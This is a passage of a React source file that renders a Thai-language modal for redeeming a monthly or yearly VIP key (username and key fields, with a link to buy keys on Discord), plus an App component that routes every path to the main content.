                 <ShoppingCart className="w-4 h-4" /> ซื้อคีย์ได้ที่ Discord
               </a>
            </div>

            <div className="relative z-10">
              {vipTab === 'key' && (
                  <form onSubmit={(e) => {
                    e.preventDefault();
                    const formData = new FormData(e.currentTarget);
                    const key = formData.get('key') as string;
                    if (key) redeemKey(key);
                  }} className="space-y-4">
                  <div>
                      <label className="text-[11px] text-zinc-400 font-bold uppercase tracking-wider mb-2 block">ชื่อผู้ใช้งาน (Username)</label>
                      <div className="relative">
                        <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
                        <input required name="username" type="text" className="w-full bg-[#09090b] border border-white/10 rounded-xl py-3 pl-10 pr-4 text-sm focus:border-amber-500 outline-none text-white transition-all placeholder:text-zinc-600" placeholder="ชื่อที่ใช้ในระบบ" />
                      </div>
                  </div>
                  <div>
                      <label className="text-[11px] text-zinc-400 font-bold uppercase tracking-wider mb-2 block">คีย์สำหรับรายเดือน/รายปี (Key)</label>
                      <div className="relative">
                        <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
                        <input required name="key" type="text" className="w-full bg-[#09090b] border border-white/10 rounded-xl py-3 pl-10 pr-4 text-sm focus:border-amber-500 outline-none text-white transition-all placeholder:text-zinc-600" placeholder="APEX-XXXXX-XXXXX" />
                      </div>
                  </div>
                  <button type="submit" className="w-full bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 text-white font-bold py-3.5 rounded-xl shadow-[0_4px_20px_rgba(245,158,11,0.2)] transition-all mt-4">
                    เปิดใช้งาน
                  </button>
                </form>
              )}
            </div>

            <button onClick={() => setShowKeyModal(false)} className="absolute top-6 right-6 text-zinc-500 hover:text-white transition-colors bg-zinc-800/50 hover:bg-zinc-800 p-2 rounded-full z-20">
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>
      )}

    </div>
  );
}

export default function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="*" element={<AppContent />} />
      </Routes>
    </BrowserRouter>
  );
}

